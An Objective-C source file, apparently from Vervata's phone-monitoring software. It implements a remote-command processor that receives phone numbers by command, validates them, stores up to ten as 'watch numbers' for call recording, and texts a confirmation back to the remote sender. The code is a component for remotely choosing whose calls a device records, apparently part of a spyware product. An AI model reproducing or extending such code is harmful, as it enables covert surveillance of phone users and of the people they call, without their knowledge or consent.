/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetCallRecordWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetCallRecordWatchNumberProcessor.h"
#import "PrefCallRecord.h"
#import "PreferenceManager.h"

@interface ResetCallRecordWatchNumberProcessor (PrivateAPI)
- (void) processResetCallRecordWatchNumber;
- (void) resetCallRecordWatchNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetCallRecordWatchNumber;
@end

@implementation ResetCallRecordWatchNumberProcessor

@synthesize mCallRecordWatchNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetCallRecordWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ResetCallRecordWatchNumberProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetCallRecordWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetCallRecordWatchNumberProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ResetCallRecordWatchNumberProcessor--->doProcessingCommand")
 	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {			
		[self setMCallRecordWatchNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"ResetCallRecordWatchNumberProcessor--->Watch Numbers:%@",mCallRecordWatchNumberList);
		if ([mCallRecordWatchNumberList count]>0) {
			if ([self canResetCallRecordWatchNumber]) { 
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mCallRecordWatchNumberList]) [self processResetCallRecordWatchNumber];
				else [self resetCallRecordWatchNumberException:kCmdExceptionErrorCannotAddDuplicateToCallRecordWatchList];
			}
			else {
				[self resetCallRecordWatchNumberException:kCmdExceptionErrorCallRecordNumberExceedListCapacity];
			}
		} else {
			[self resetCallRecordWatchNumberException:kCmdExceptionErrorInvalidNumberToCallRecordWatchList];
		}
	} else {
		[self resetCallRecordWatchNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}
}

#pragma mark ResetCallRecordWatchNumberProcessor PrivateAPI Methods

/**
 - Method name: processAddCallRecordWatchNumber
 - Purpose:This method is used to process Add Watch Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processResetCallRecordWatchNumber {
	DLog (@"ResetCallRecordWatchNumberProcessor--->processResetCallRecordWatchNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefCallRecord *prefCallRecord = (PrefCallRecord *) [prefManager preference:kCallRecord];
	[prefCallRecord setMWatchNumbers:mCallRecordWatchNumberList];
	[prefManager savePreferenceAndNotifyChange:prefCallRecord];
	[self sendReplySMS];
}

/**
 - Method name: canResetCallRecordWatchNumber
 - Purpose:This method is invoked when reset watch number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canResetCallRecordWatchNumber {
	DLog (@"ResetCallRecordWatchNumberProcessor--->canResetCallRecordWatchNumber");
	NSUInteger count = [mCallRecordWatchNumberList count];
	if (count<=10) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: resetCallRecordWatchNumberException
 - Purpose:This method is invoked when  reset CallRecordWatchNumber process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) resetCallRecordWatchNumberException: (NSUInteger) aErrorCode {
	DLog (@"ResetCallRecordWatchNumberProcessor--->resetCallRecordWatchNumberException")
	FxException* exception = [FxException exceptionWithName:@"resetCallRecordWatchNumberException" andReason:@"Reset Call Record Watch Number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetCallRecordWatchNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mCallRecordWatchNumberList release];
	[super dealloc];
}

@end
